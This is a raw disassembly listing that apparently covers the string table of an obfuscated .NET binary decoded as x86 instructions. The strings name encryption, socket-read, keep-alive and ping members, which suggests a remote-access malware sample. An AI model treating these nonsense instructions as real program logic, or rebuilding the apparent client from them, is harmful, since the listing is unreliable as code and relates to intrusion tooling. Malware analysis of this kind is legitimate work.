  40802c:	49                   	dec    %ecx
  40802d:	42                   	inc    %edx
  40802e:	70 48                	jo     0x408078
  408030:	54                   	push   %esp
  408031:	00 51 59             	add    %dl,0x59(%ecx)
  408034:	47                   	inc    %edi
  408035:	49                   	dec    %ecx
  408036:	42                   	inc    %edx
  408037:	50                   	push   %eax
  408038:	51                   	push   %ecx
  408039:	65 57                	gs push %edi
  40803b:	54                   	push   %esp
  40803c:	4f                   	dec    %edi
  40803d:	54                   	push   %esp
  40803e:	00 42 54             	add    %al,0x54(%edx)
  408041:	66 54                	push   %sp
  408043:	76 51                	jbe    0x408096
  408045:	54                   	push   %esp
  408046:	5a                   	pop    %edx
  408047:	65 6f                	outsl  %gs:(%esi),(%dx)
  408049:	77 70                	ja     0x4080bb
  40804b:	56                   	push   %esi
  40804c:	54                   	push   %esp
  40804d:	00 58 52             	add    %bl,0x52(%eax)
  408050:	6c                   	insb   (%dx),%es:(%edi)
  408051:	46                   	inc    %esi
  408052:	64 54                	fs push %esp
  408054:	79 51                	jns    0x4080a7
  408056:	74 53                	je     0x4080ab
  408058:	77 4a                	ja     0x4080a4
  40805a:	59                   	pop    %ecx
  40805b:	49                   	dec    %ecx
  40805c:	74 54                	je     0x4080b2
  40805e:	00 45 51             	add    %al,0x51(%ebp)
  408061:	51                   	push   %ecx
  408062:	6b 69 4d 5a          	imul   $0x5a,0x4d(%ecx),%ebp
  408066:	53                   	push   %ebx
  408067:	78 54                	js     0x4080bd
  408069:	00 6e 69             	add    %ch,0x69(%esi)
  40806c:	75 67                	jne    0x4080d5
  40806e:	51                   	push   %ecx
  40806f:	78 69                	js     0x4080da
  408071:	63 66 56             	arpl   %esp,0x56(%esi)
  408074:	46                   	inc    %esi
  408075:	44                   	inc    %esp
  408076:	55                   	push   %ebp
  408077:	00 66 78             	add    %ah,0x78(%esi)
  40807a:	78 4a                	js     0x4080c6
  40807c:	53                   	push   %ebx
  40807d:	75 44                	jne    0x4080c3
  40807f:	4d                   	dec    %ebp
  408080:	49                   	dec    %ecx
  408081:	50                   	push   %eax
  408082:	50                   	push   %eax
  408083:	53                   	push   %ebx
  408084:	4e                   	dec    %esi
  408085:	55                   	push   %ebp
  408086:	00 45 58             	add    %al,0x58(%ebp)
  408089:	78 64                	js     0x4080ef
  40808b:	55                   	push   %ebp
  40808c:	73 78                	jae    0x408106
  40808e:	6e                   	outsb  %ds:(%esi),(%dx)
  40808f:	56                   	push   %esi
  408090:	55                   	push   %ebp
  408091:	00 4d 63             	add    %cl,0x63(%ebp)
  408094:	53                   	push   %ebx
  408095:	75 6e                	jne    0x408105
  408097:	4d                   	dec    %ebp
  408098:	44                   	inc    %esp
  408099:	63 6f 57             	arpl   %ebp,0x57(%edi)
  40809c:	55                   	push   %ebp
  40809d:	00 63 6b             	add    %ah,0x6b(%ebx)
  4080a0:	43                   	inc    %ebx
  4080a1:	4d                   	dec    %ebp
  4080a2:	4c                   	dec    %esp
  4080a3:	64 53                	fs push %ebx
  4080a5:	5a                   	pop    %edx
  4080a6:	70 57                	jo     0x4080ff
  4080a8:	65 57                	gs push %edi
  4080aa:	59                   	pop    %ecx
  4080ab:	55                   	push   %ebp
  4080ac:	00 72 77             	add    %dh,0x77(%edx)
  4080af:	6b 58 73 53          	imul   $0x53,0x73(%eax),%ebx
  4080b3:	5a                   	pop    %edx
  4080b4:	63 41 6d             	arpl   %eax,0x6d(%ecx)
  4080b7:	55                   	push   %ebp
  4080b8:	00 75 4f             	add    %dh,0x4f(%ebp)
  4080bb:	54                   	push   %esp
  4080bc:	76 6b                	jbe    0x408129
  4080be:	63 59 63             	arpl   %ebx,0x63(%ecx)
  4080c1:	50                   	push   %eax
  4080c2:	6d                   	insl   (%dx),%es:(%edi)
  4080c3:	55                   	push   %ebp
  4080c4:	00 59 58             	add    %bl,0x58(%ecx)
  4080c7:	6a 42                	push   $0x42
  4080c9:	7a 49                	jp     0x408114
  4080cb:	58                   	pop    %eax
  4080cc:	43                   	inc    %ebx
  4080cd:	72 51                	jb     0x408120
  4080cf:	66 6d                	insw   (%dx),%es:(%edi)
  4080d1:	55                   	push   %ebp
  4080d2:	00 7a 4b             	add    %bh,0x4b(%edx)
  4080d5:	4c                   	dec    %esp
  4080d6:	58                   	pop    %eax
  4080d7:	53                   	push   %ebx
  4080d8:	4f                   	dec    %edi
  4080d9:	4f                   	dec    %edi
  4080da:	48                   	dec    %eax
  4080db:	6f                   	outsl  %ds:(%esi),(%dx)
  4080dc:	42                   	inc    %edx
  4080dd:	64 70 55             	fs jo  0x408135
  4080e0:	00 4d 66             	add    %cl,0x66(%ebp)
  4080e3:	49                   	dec    %ecx
  4080e4:	43                   	inc    %ebx
  4080e5:	49                   	dec    %ecx
  4080e6:	73 66                	jae    0x40814e
  4080e8:	6b 70 55 00          	imul   $0x0,0x55(%eax),%esi
  4080ec:	41                   	inc    %ecx
  4080ed:	73 7a                	jae    0x408169
  4080ef:	42                   	inc    %edx
  4080f0:	54                   	push   %esp
  4080f1:	55                   	push   %ebp
  4080f2:	54                   	push   %esp
  4080f3:	68 50 79 55 00       	push   $0x557950
  4080f8:	4c                   	dec    %esp
  4080f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4080fa:	77 64                	ja     0x408160
  4080fc:	42                   	inc    %edx
  4080fd:	41                   	inc    %ecx
  4080fe:	57                   	push   %edi
  4080ff:	54                   	push   %esp
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	75 43                	jne    0x408146
  408103:	56                   	push   %esi
  408104:	00 4d 51             	add    %cl,0x51(%ebp)
  408107:	59                   	pop    %ecx
  408108:	58                   	pop    %eax
  408109:	4f                   	dec    %edi
  40810a:	71 61                	jno    0x40816d
  40810c:	6e                   	outsb  %ds:(%esi),(%dx)
  40810d:	67 44                	addr16 inc %esp
  40810f:	56                   	push   %esi
  408110:	00 67 65             	add    %ah,0x65(%edi)
  408113:	74 5f                	je     0x408174
  408115:	49                   	dec    %ecx
  408116:	56                   	push   %esi
  408117:	00 73 65             	add    %dh,0x65(%ebx)
  40811a:	74 5f                	je     0x40817b
  40811c:	49                   	dec    %ecx
  40811d:	56                   	push   %esi
  40811e:	00 47 65             	add    %al,0x65(%edi)
  408121:	6e                   	outsb  %ds:(%esi),(%dx)
  408122:	65 72 61             	gs jb  0x408186
  408125:	74 65                	je     0x40818c
  408127:	49                   	dec    %ecx
  408128:	56                   	push   %esi
  408129:	00 52 46             	add    %dl,0x46(%edx)
  40812c:	68 62 70 6f 49       	push   $0x496f7062
  408131:	51                   	push   %ecx
  408132:	53                   	push   %ebx
  408133:	78 56                	js     0x40818b
  408135:	00 67 51             	add    %ah,0x51(%edi)
  408138:	46                   	inc    %esi
  408139:	6e                   	outsb  %ds:(%esi),(%dx)
  40813a:	6c                   	insb   (%dx),%es:(%edi)
  40813b:	70 59                	jo     0x408196
  40813d:	59                   	pop    %ecx
  40813e:	53                   	push   %ebx
  40813f:	4f                   	dec    %edi
  408140:	47                   	inc    %edi
  408141:	4d                   	dec    %ebp
  408142:	7a 56                	jp     0x40819a
  408144:	00 53 64             	add    %dl,0x64(%ebx)
  408147:	63 6a 6e             	arpl   %ebp,0x6e(%edx)
  40814a:	45                   	inc    %ebp
  40814b:	6f                   	outsl  %ds:(%esi),(%dx)
  40814c:	6d                   	insl   (%dx),%es:(%edi)
  40814d:	47                   	inc    %edi
  40814e:	46                   	inc    %esi
  40814f:	53                   	push   %ebx
  408150:	57                   	push   %edi
  408151:	00 48 5a             	add    %cl,0x5a(%eax)
  408154:	56                   	push   %esi
  408155:	42                   	inc    %edx
  408156:	70 69                	jo     0x4081c1
  408158:	54                   	push   %esp
  408159:	54                   	push   %esp
  40815a:	45                   	inc    %ebp
  40815b:	71 50                	jno    0x4081ad
  40815d:	69 65 57 00 5a 59 44 	imul   $0x44595a00,0x57(%ebp),%esp
  408164:	54                   	push   %esp
  408165:	6d                   	insl   (%dx),%es:(%edi)
  408166:	51                   	push   %ecx
  408167:	53                   	push   %ebx
  408168:	41                   	inc    %ecx
  408169:	52                   	push   %edx
  40816a:	41                   	inc    %ecx
  40816b:	51                   	push   %ecx
  40816c:	7a 65                	jp     0x4081d3
  40816e:	57                   	push   %edi
  40816f:	00 61 63             	add    %ah,0x63(%ecx)
  408172:	50                   	push   %eax
  408173:	73 78                	jae    0x4081ed
  408175:	74 6e                	je     0x4081e5
  408177:	47                   	inc    %edi
  408178:	58                   	pop    %eax
  408179:	44                   	inc    %esp
  40817a:	68 57 00 52 59       	push   $0x59520057
  40817f:	78 59                	js     0x4081da
  408181:	52                   	push   %edx
  408182:	64 5a                	fs pop %edx
  408184:	6a 53                	push   $0x53
  408186:	59                   	pop    %ecx
  408187:	6d                   	insl   (%dx),%es:(%edi)
  408188:	57                   	push   %edi
  408189:	00 51 41             	add    %dl,0x41(%ecx)
  40818c:	4e                   	dec    %esi
  40818d:	74 4e                	je     0x4081dd
  40818f:	4e                   	dec    %esi
  408190:	51                   	push   %ecx
  408191:	6e                   	outsb  %ds:(%esi),(%dx)
  408192:	4a                   	dec    %edx
  408193:	77 57                	ja     0x4081ec
  408195:	00 69 76             	add    %ch,0x76(%ecx)
  408198:	50                   	push   %eax
  408199:	6c                   	insb   (%dx),%es:(%edi)
  40819a:	4c                   	dec    %esp
  40819b:	71 66                	jno    0x408203
  40819d:	75 6f                	jne    0x40820e
  40819f:	68 6a 6f 4d 58       	push   $0x584d6f6a
  4081a4:	00 70 62             	add    %dh,0x62(%eax)
  4081a7:	50                   	push   %eax
  4081a8:	75 4e                	jne    0x4081f8
  4081aa:	52                   	push   %edx
  4081ab:	6b 61 55 58          	imul   $0x58,0x55(%ecx),%esp
  4081af:	00 76 5a             	add    %dh,0x5a(%esi)
  4081b2:	74 49                	je     0x4081fd
  4081b4:	6d                   	insl   (%dx),%es:(%edi)
  4081b5:	73 48                	jae    0x4081ff
  4081b7:	6c                   	insb   (%dx),%es:(%edi)
  4081b8:	53                   	push   %ebx
  4081b9:	42                   	inc    %edx
  4081ba:	68 58 00 6e 78       	push   $0x786e0058
  4081bf:	65 43                	gs inc %ebx
  4081c1:	56                   	push   %esi
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	70 6d                	jo     0x408232
  4081c5:	50                   	push   %eax
  4081c6:	58                   	pop    %eax
  4081c7:	45                   	inc    %ebp
  4081c8:	59                   	pop    %ecx
  4081c9:	00 63 65             	add    %ah,0x65(%ebx)
  4081cc:	45                   	inc    %ebp
  4081cd:	5a                   	pop    %edx
  4081ce:	61                   	popa
  4081cf:	46                   	inc    %esi
  4081d0:	79 6b                	jns    0x40823d
  4081d2:	78 6f                	js     0x408243
  4081d4:	72 46                	jb     0x40821c
  4081d6:	57                   	push   %edi
  4081d7:	59                   	pop    %ecx
  4081d8:	52                   	push   %edx
  4081d9:	59                   	pop    %ecx
  4081da:	00 50 68             	add    %dl,0x68(%eax)
  4081dd:	7a 6b                	jp     0x40824a
  4081df:	74 6e                	je     0x40824f
  4081e1:	49                   	dec    %ecx
  4081e2:	51                   	push   %ecx
  4081e3:	52                   	push   %edx
  4081e4:	54                   	push   %esp
  4081e5:	61                   	popa
  4081e6:	59                   	pop    %ecx
  4081e7:	00 65 59             	add    %ah,0x59(%ebp)
  4081ea:	64 73 74             	fs jae 0x408261
  4081ed:	78 51                	js     0x408240
  4081ef:	76 43                	jbe    0x408234
  4081f1:	4f                   	dec    %edi
  4081f2:	44                   	inc    %esp
  4081f3:	65 70 62             	gs jo  0x408258
  4081f6:	59                   	pop    %ecx
  4081f7:	00 42 45             	add    %al,0x45(%edx)
  4081fa:	64 54                	fs push %esp
  4081fc:	53                   	push   %ebx
  4081fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fe:	66 4d                	dec    %bp
  408200:	73 51                	jae    0x408253
  408202:	54                   	push   %esp
  408203:	6b 65 59 00          	imul   $0x0,0x59(%ebp),%esp
  408207:	73 6c                	jae    0x408275
  408209:	61                   	popa
  40820a:	41                   	inc    %ecx
  40820b:	61                   	popa
  40820c:	6f                   	outsl  %ds:(%esi),(%dx)
  40820d:	6c                   	insb   (%dx),%es:(%edi)
  40820e:	44                   	inc    %esp
  40820f:	55                   	push   %ebp
  408210:	57                   	push   %edi
  408211:	4b                   	dec    %ebx
  408212:	72 59                	jb     0x40826d
  408214:	00 6d 6d             	add    %ch,0x6d(%ebp)
  408217:	65 76 72             	gs jbe 0x40828c
  40821a:	67 53                	addr16 push %ebx
  40821c:	64 43                	fs inc %ebx
  40821e:	76 59                	jbe    0x408279
  408220:	00 47 49             	add    %al,0x49(%edi)
  408223:	73 79                	jae    0x40829e
  408225:	4c                   	dec    %esp
  408226:	59                   	pop    %ecx
  408227:	6e                   	outsb  %ds:(%esi),(%dx)
  408228:	6f                   	outsl  %ds:(%esi),(%dx)
  408229:	55                   	push   %ebp
  40822a:	47                   	inc    %edi
  40822b:	70 71                	jo     0x40829e
  40822d:	41                   	inc    %ecx
  40822e:	5a                   	pop    %edx
  40822f:	00 59 44             	add    %bl,0x44(%ecx)
  408232:	4d                   	dec    %ebp
  408233:	44                   	inc    %esp
  408234:	65 54                	gs push %esp
  408236:	68 79 77 6a 4b       	push   $0x4b6a7779
  40823b:	5a                   	pop    %edx
  40823c:	00 47 47             	add    %al,0x47(%edi)
  40823f:	64 52                	fs push %edx
  408241:	56                   	push   %esi
  408242:	47                   	inc    %edi
  408243:	6e                   	outsb  %ds:(%esi),(%dx)
  408244:	4a                   	dec    %edx
  408245:	59                   	pop    %ecx
  408246:	76 66                	jbe    0x4082ae
  408248:	4c                   	dec    %esp
  408249:	5a                   	pop    %edx
  40824a:	00 43 48             	add    %al,0x48(%ebx)
  40824d:	59                   	pop    %ecx
  40824e:	71 6a                	jno    0x4082ba
  408250:	4a                   	dec    %edx
  408251:	76 45                	jbe    0x408298
  408253:	59                   	pop    %ecx
  408254:	6b 41 6b 5a          	imul   $0x5a,0x6b(%ecx),%eax
  408258:	00 47 64             	add    %al,0x64(%edi)
  40825b:	45                   	inc    %ebp
  40825c:	68 76 79 67 66       	push   $0x66677976
  408261:	6f                   	outsl  %ds:(%esi),(%dx)
  408262:	5a                   	pop    %edx
  408263:	00 76 61             	add    %dh,0x61(%esi)
  408266:	6c                   	insb   (%dx),%es:(%edi)
  408267:	75 65                	jne    0x4082ce
  408269:	5f                   	pop    %edi
  40826a:	5f                   	pop    %edi
  40826b:	00 78 72             	add    %bh,0x72(%eax)
  40826e:	4b                   	dec    %ebx
  40826f:	46                   	inc    %esi
  408270:	73 57                	jae    0x4082c9
  408272:	46                   	inc    %esi
  408273:	76 42                	jbe    0x4082b7
  408275:	79 56                	jns    0x4082cd
  408277:	54                   	push   %esp
  408278:	61                   	popa
  408279:	00 6c 58 69          	add    %ch,0x69(%eax,%ebx,2)
  40827d:	64 6c                	fs insb (%dx),%es:(%edi)
  40827f:	41                   	inc    %ecx
  408280:	75 65                	jne    0x4082e7
  408282:	6f                   	outsl  %ds:(%esi),(%dx)
  408283:	42                   	inc    %edx
  408284:	55                   	push   %ebp
  408285:	61                   	popa
  408286:	00 78 6f             	add    %bh,0x6f(%eax)
  408289:	44                   	inc    %esp
  40828a:	6e                   	outsb  %ds:(%esi),(%dx)
  40828b:	74 4b                	je     0x4082d8
  40828d:	6f                   	outsl  %ds:(%esi),(%dx)
  40828e:	5a                   	pop    %edx
  40828f:	4e                   	dec    %esi
  408290:	42                   	inc    %edx
  408291:	4c                   	dec    %esp
  408292:	58                   	pop    %eax
  408293:	61                   	popa
  408294:	00 55 64             	add    %dl,0x64(%ebp)
  408297:	71 76                	jno    0x40830f
  408299:	66 57                	push   %di
  40829b:	54                   	push   %esp
  40829c:	49                   	dec    %ecx
  40829d:	6d                   	insl   (%dx),%es:(%edi)
  40829e:	50                   	push   %eax
  40829f:	6b 61 00 4a          	imul   $0x4a,0x0(%ecx),%esp
  4082a3:	53                   	push   %ebx
  4082a4:	61                   	popa
  4082a5:	72 43                	jb     0x4082ea
  4082a7:	4e                   	dec    %esi
  4082a8:	5a                   	pop    %edx
  4082a9:	75 78                	jne    0x408323
  4082ab:	4b                   	dec    %ebx
  4082ac:	41                   	inc    %ecx
  4082ad:	62 00                	bound  %eax,(%eax)
  4082af:	65 42                	gs inc %edx
  4082b1:	75 4f                	jne    0x408302
  4082b3:	47                   	inc    %edi
  4082b4:	4a                   	dec    %edx
  4082b5:	6c                   	insb   (%dx),%es:(%edi)
  4082b6:	54                   	push   %esp
  4082b7:	4c                   	dec    %esp
  4082b8:	62 00                	bound  %eax,(%eax)
  4082ba:	70 68                	jo     0x408324
  4082bc:	5a                   	pop    %edx
  4082bd:	46                   	inc    %esi
  4082be:	53                   	push   %ebx
  4082bf:	58                   	pop    %eax
  4082c0:	56                   	push   %esi
  4082c1:	74 64                	je     0x408327
  4082c3:	75 53                	jne    0x408318
  4082c5:	70 4f                	jo     0x408316
  4082c7:	5a                   	pop    %edx
  4082c8:	62 00                	bound  %eax,(%eax)
  4082ca:	6d                   	insl   (%dx),%es:(%edi)
  4082cb:	73 63                	jae    0x408330
  4082cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ce:	72 6c                	jb     0x40833c
  4082d0:	69 62 00 64 43 75 45 	imul   $0x45754364,0x0(%edx),%esp
  4082d7:	6a 63                	push   $0x63
  4082d9:	76 67                	jbe    0x408342
  4082db:	76 62                	jbe    0x40833f
  4082dd:	6a 44                	push   $0x44
  4082df:	63 00                	arpl   %eax,(%eax)
  4082e1:	47                   	inc    %edi
  4082e2:	4c                   	dec    %esp
  4082e3:	43                   	inc    %ebx
  4082e4:	49                   	dec    %ecx
  4082e5:	66 54                	push   %sp
  4082e7:	61                   	popa
  4082e8:	50                   	push   %eax
  4082e9:	6b 4c 71 52 63       	imul   $0x63,0x52(%ecx,%esi,2),%ecx
  4082ee:	00 47 69             	add    %al,0x69(%edi)
  4082f1:	6d                   	insl   (%dx),%es:(%edi)
  4082f2:	4e                   	dec    %esi
  4082f3:	49                   	dec    %ecx
  4082f4:	7a 61                	jp     0x408357
  4082f6:	50                   	push   %eax
  4082f7:	76 52                	jbe    0x40834b
  4082f9:	63 00                	arpl   %eax,(%eax)
  4082fb:	58                   	pop    %eax
  4082fc:	41                   	inc    %ecx
  4082fd:	52                   	push   %edx
  4082fe:	6a 4d                	push   $0x4d
  408300:	56                   	push   %esi
  408301:	58                   	pop    %eax
  408302:	4d                   	dec    %ebp
  408303:	70 41                	jo     0x408346
  408305:	75 5a                	jne    0x408361
  408307:	63 00                	arpl   %eax,(%eax)
  408309:	53                   	push   %ebx
  40830a:	79 73                	jns    0x40837f
  40830c:	74 65                	je     0x408373
  40830e:	6d                   	insl   (%dx),%es:(%edi)
  40830f:	2e 43                	cs inc %ebx
  408311:	6f                   	outsl  %ds:(%esi),(%dx)
  408312:	6c                   	insb   (%dx),%es:(%edi)
  408313:	6c                   	insb   (%dx),%es:(%edi)
  408314:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408319:	6e                   	outsb  %ds:(%esi),(%dx)
  40831a:	73 2e                	jae    0x40834a
  40831c:	47                   	inc    %edi
  40831d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40831f:	65 72 69             	gs jb  0x40838b
  408322:	63 00                	arpl   %eax,(%eax)
  408324:	4d                   	dec    %ebp
  408325:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40832c:	74 2e                	je     0x40835c
  40832e:	56                   	push   %esi
  40832f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408336:	73 69                	jae    0x4083a1
  408338:	63 00                	arpl   %eax,(%eax)
  40833a:	67 65 74 5f          	addr16 gs je 0x40839d
  40833e:	53                   	push   %ebx
  40833f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408341:	64 53                	fs push %ebx
  408343:	79 6e                	jns    0x4083b3
  408345:	63 00                	arpl   %eax,(%eax)
  408347:	47                   	inc    %edi
  408348:	43                   	inc    %ebx
  408349:	57                   	push   %edi
  40834a:	41                   	inc    %ecx
  40834b:	72 6c                	jb     0x4083b9
  40834d:	4c                   	dec    %esp
  40834e:	73 6b                	jae    0x4083bb
  408350:	70 69                	jo     0x4083bb
  408352:	76 63                	jbe    0x4083b7
  408354:	00 77 77             	add    %dh,0x77(%edi)
  408357:	50                   	push   %eax
  408358:	54                   	push   %esp
  408359:	65 78 79             	gs js  0x4083d5
  40835c:	4a                   	dec    %edx
  40835d:	77 63                	ja     0x4083c2
  40835f:	00 43 55             	add    %al,0x55(%ebx)
  408362:	51                   	push   %ecx
  408363:	67 65 57             	addr16 gs push %edi
  408366:	76 6b                	jbe    0x4083d3
  408368:	46                   	inc    %esi
  408369:	50                   	push   %eax
  40836a:	78 63                	js     0x4083cf
  40836c:	00 4a 64             	add    %cl,0x64(%edx)
  40836f:	78 59                	js     0x4083ca
  408371:	74 4c                	je     0x4083bf
  408373:	63 76 73             	arpl   %esi,0x73(%esi)
  408376:	45                   	inc    %ebp
  408377:	64 4a                	fs dec %edx
  408379:	79 63                	jns    0x4083de
  40837b:	00 57 59             	add    %dl,0x59(%edi)
  40837e:	73 65                	jae    0x4083e5
  408380:	6f                   	outsl  %ds:(%esi),(%dx)
  408381:	75 4f                	jne    0x4083d2
  408383:	58                   	pop    %eax
  408384:	4b                   	dec    %ebx
  408385:	4e                   	dec    %esi
  408386:	6a 79                	push   $0x79
  408388:	63 00                	arpl   %eax,(%eax)
  40838a:	4e                   	dec    %esi
  40838b:	57                   	push   %edi
  40838c:	72 79                	jb     0x408407
  40838e:	78 61                	js     0x4083f1
  408390:	6b 45 43 50          	imul   $0x50,0x43(%ebp),%eax
  408394:	44                   	inc    %esp
  408395:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408399:	67 41                	addr16 inc %ecx
  40839b:	70 78                	jo     0x408415
  40839d:	71 69                	jno    0x408408
  40839f:	71 7a                	jno    0x40841b
  4083a1:	74 51                	je     0x4083f4
  4083a3:	64 00 79 72          	add    %bh,%fs:0x72(%ecx)
  4083a7:	76 70                	jbe    0x408419
  4083a9:	4b                   	dec    %ebx
  4083aa:	72 48                	jb     0x4083f4
  4083ac:	41                   	inc    %ecx
  4083ad:	58                   	pop    %eax
  4083ae:	56                   	push   %esi
  4083af:	64 00 77 54          	add    %dh,%fs:0x54(%edi)
  4083b3:	70 63                	jo     0x408418
  4083b5:	6b 6e 70 4e          	imul   $0x4e,0x70(%esi),%ebp
  4083b9:	5a                   	pop    %edx
  4083ba:	5a                   	pop    %edx
  4083bb:	57                   	push   %edi
  4083bc:	64 00 4f 6d          	add    %cl,%fs:0x6d(%edi)
  4083c0:	6d                   	insl   (%dx),%es:(%edi)
  4083c1:	4f                   	dec    %edi
  4083c2:	78 6c                	js     0x408430
  4083c4:	4b                   	dec    %ebx
  4083c5:	45                   	inc    %ebp
  4083c6:	56                   	push   %esi
  4083c7:	5a                   	pop    %edx
  4083c8:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4083cc:	64 52                	fs push %edx
  4083ce:	65 61                	gs popa
  4083d0:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4083d4:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4083db:	00 
  4083dc:	54                   	push   %esp
  4083dd:	68 72 65 61 64       	push   $0x64616572
  4083e2:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4083e6:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4083ea:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  4083ee:	41                   	inc    %ecx
  4083ef:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  4083f5:	61                   	popa
  4083f6:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  4083fc:	74 5f                	je     0x40845d
  4083fe:	43                   	inc    %ebx
  4083ff:	6f                   	outsl  %ds:(%esi),(%dx)
  408400:	6e                   	outsb  %ds:(%esi),(%dx)
  408401:	6e                   	outsb  %ds:(%esi),(%dx)
  408402:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408407:	00 67 65             	add    %ah,0x65(%edi)
  40840a:	74 5f                	je     0x40846b
  40840c:	49                   	dec    %ecx
  40840d:	73 43                	jae    0x408452
  40840f:	6f                   	outsl  %ds:(%esi),(%dx)
  408410:	6e                   	outsb  %ds:(%esi),(%dx)
  408411:	6e                   	outsb  %ds:(%esi),(%dx)
  408412:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408417:	00 73 65             	add    %dh,0x65(%ebx)
  40841a:	74 5f                	je     0x40847b
  40841c:	49                   	dec    %ecx
  40841d:	73 43                	jae    0x408462
  40841f:	6f                   	outsl  %ds:(%esi),(%dx)
  408420:	6e                   	outsb  %ds:(%esi),(%dx)
  408421:	6e                   	outsb  %ds:(%esi),(%dx)
  408422:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408427:	00 67 65             	add    %ah,0x65(%edi)
  40842a:	74 5f                	je     0x40848b
  40842c:	47                   	inc    %edi
  40842d:	75 69                	jne    0x408498
  40842f:	64 00 58 6b          	add    %bl,%fs:0x6b(%eax)
  408433:	6c                   	insb   (%dx),%es:(%edi)
  408434:	59                   	pop    %ecx
  408435:	45                   	inc    %ebp
  408436:	66 58                	pop    %ax
  408438:	6e                   	outsb  %ds:(%esi),(%dx)
  408439:	56                   	push   %esi
  40843a:	46                   	inc    %esi
  40843b:	72 6b                	jb     0x4084a8
  40843d:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  408441:	65 6e                	outsb  %gs:(%esi),(%dx)
  408443:	64 53                	fs push %ebx
  408445:	79 6e                	jns    0x4084b5
  408447:	63 3e                	arpl   %edi,(%esi)
  408449:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40844d:	61                   	popa
  40844e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408451:	6e                   	outsb  %ds:(%esi),(%dx)
  408452:	67 46                	addr16 inc %esi
  408454:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40845b:	73 43                	jae    0x4084a0
  40845d:	6f                   	outsl  %ds:(%esi),(%dx)
  40845e:	6e                   	outsb  %ds:(%esi),(%dx)
  40845f:	6e                   	outsb  %ds:(%esi),(%dx)
  408460:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408465:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40846a:	61                   	popa
  40846b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40846e:	6e                   	outsb  %ds:(%esi),(%dx)
  40846f:	67 46                	addr16 inc %esi
  408471:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  408478:	65 65 70 41          	gs gs jo 0x4084bd
  40847c:	6c                   	insb   (%dx),%es:(%edi)
  40847d:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408484:	42                   	inc    %edx
  408485:	61                   	popa
  408486:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408489:	6e                   	outsb  %ds:(%esi),(%dx)
  40848a:	67 46                	addr16 inc %esi
  40848c:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408493:	65 61                	gs popa
  408495:	64 65 72 53          	fs gs jb 0x4084ec
  408499:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4084a0:	42                   	inc    %edx
  4084a1:	61                   	popa
  4084a2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a6:	67 46                	addr16 inc %esi
  4084a8:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4084af:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4084b6:	42                   	inc    %edx
  4084b7:	61                   	popa
  4084b8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084bc:	67 46                	addr16 inc %esi
  4084be:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  4084c5:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084c9:	61                   	popa
  4084ca:	74 65                	je     0x408531
  4084cc:	50                   	push   %eax
  4084cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4084cf:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  4084d5:	61                   	popa
  4084d6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084da:	67 46                	addr16 inc %esi
  4084dc:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4084e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e4:	74 65                	je     0x40854b
  4084e6:	72 76                	jb     0x40855e
  4084e8:	61                   	popa
  4084e9:	6c                   	insb   (%dx),%es:(%edi)
  4084ea:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4084ef:	61                   	popa
  4084f0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	67 46                	addr16 inc %esi
  4084f6:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  4084fd:	75 66                	jne    0x408565
